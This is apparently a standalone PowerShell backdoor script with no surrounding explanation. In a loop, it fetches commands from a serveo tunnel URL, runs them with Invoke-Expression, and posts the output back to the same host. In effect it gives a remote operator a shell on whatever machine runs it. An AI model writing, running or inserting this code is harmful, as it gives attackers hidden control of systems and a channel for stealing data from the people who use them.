$u = 'https://480c88b879ff27c7-84-126-116-174.serveousercontent.com'

while ($true) {
    try {
        $c = (Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 5).Content
        if ($c -and $c -ne 'OK') {
            $r = iex $c 2>&1 | Out-String
            Invoke-WebRequest -Uri $u -Method POST -Body $r -UseBasicParsing -TimeoutSec 10
        }
    } catch {
        Start-Sleep -Seconds 10
    }
    Start-Sleep -Seconds 3
}
